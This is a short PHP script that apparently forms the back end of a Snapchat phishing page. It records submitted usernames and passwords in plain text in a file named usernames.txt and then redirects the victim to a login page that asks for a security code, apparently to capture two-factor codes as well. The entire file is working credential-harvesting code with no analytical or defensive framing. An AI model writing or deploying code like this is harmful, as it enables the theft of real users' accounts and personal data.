<?php

file_put_contents("usernames.txt", "Snapchat Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: login.html?showSecurityCode=true');
exit();
?>